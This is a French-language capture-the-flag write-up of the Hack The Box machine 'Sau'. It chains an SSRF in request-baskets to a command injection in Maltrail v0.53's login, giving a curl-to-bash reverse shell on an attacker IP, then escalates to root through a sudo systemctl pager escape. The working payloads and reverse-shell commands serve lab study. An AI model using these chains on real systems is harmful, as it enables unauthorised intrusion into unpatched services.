# Sau

	echo "10.10.11.224 sau.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.224 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.224 -oN nmap.txt
	feroxbuster --silent -u http://10.10.11.224:55555
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
	80/tcp filtered http  
	8338/tcp filtered unknown  
	55555/tcp open unknown

Impossible d'accéder au site du port 80 mais le site du port 55555 est ouvert et contient un genre d'API qui permet de créer des baskets pour recueillir des requêtes HTTP. Cela me fait immédiatement penser au fait de pouvoir faire pointer cette fonctionnalité sur un serveur que je contrôle.

Une SSRF a déjà été répertoriée et cela facilite grandement la phase de reconnaissance :
- https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3
- https://notes.sjtu.edu.cn/s/MUUhEymt7# 

En reprenant le payload de l'article, cela donne : 

	curl -X POST "http://sau.htb:55555/api/baskets/aaaaa" -d '{"forward_url": "http://127.0.0.1:80","proxy_response": false,"insecure_tls": true,"expand_path": true,"capacity": 250}' -H 'Content-Type: application/json'


Ensuite, en se connectant graphiquement sur l'URL http://sau.htb:55555/aaaaa on peut utiliser le token obtenu dans la réponse à notre requête POST et accéder au paramétrage du basket ainsi qu'aux requêtes faites dessus.

En allant sur http://sau.htb:55555/aaaaa on a bien une requête qui apparaît mais on a juste une page blanche. J'ai essayé de cocher et décocher les quelques cases du paramétrage du basket et j'ai fini par réussir à avoir le site du port 80 que je visais en activant le paramètre "proxy_response"

Payload équivalent en ligne de commande pour directement avoir un basket malicieux fonctionnel : 

	curl -X POST "http://sau.htb:55555/api/baskets/aaaaa2" -d '{"forward_url": "http://127.0.0.1:80","proxy_response": true,"insecure_tls": true,"expand_path": true,"capacity": 250}' -H 'Content-Type: application/json'

J'arrive donc sur le site du port 80. Il y a juste une interface précaire avec quelques liens redirigeant vers un Github, mais je vois "Powered by Maltrail (v0.53)" en bas à gauche. Par chance, Maltrail est vulnérable aux injections de commande avant la v0.54 et il existe des articles avec des PoC : https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/ 

	echo "sh -i >& /dev/tcp/10.10.16.57/443 0>&1" > shell
	sudo cp shell /var/www/html/
	sudo tail /var/log/apache2/access.log -f
	curl http://sau.htb:55555/aaaaa2/login --data 'username=; `curl http://10.10.16.57/test.txt`'
	curl http://sau.htb:55555/aaaaa2/login --data  'username=; `curl http://10.10.16.57/shell | bash`'

Après pas mal de tentatives, j'ai finalement réussi à avoir le shell. Il faut noter que ce dernier payload avec le téléchargement puis "| bash" est beaucoup plus efficace. Et cela évite de s'embêter à devoir spécifier un chemin puis modifier manuellement les droits du fichier pour pouvoir l'exécuter.

	...
	rlwrap nc -nvlp 443
	...
	whoami
	cat ~/user.txt
	
### Élévation de privilèges : 

	cd /tmp
	wget http://10.10.16.57/linpeas.sh
	chmod u+x linpeas.sh
	/tmp/linpeas.sh > r.txt
	less -R r.txt

Je remarque une ligne surlignée dans le rapport : 

> User puma may run the following commands on sau:  
  > (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

Voir : https://gtfobins.github.io/gtfobins/systemctl/#sudo 
	
	python3 -c 'import pty ; pty.spawn("/bin/bash")'
	sudo /usr/bin/systemctl status trail.service
	...
	!/bin/bash
	whoami
	cat /root/root.txt


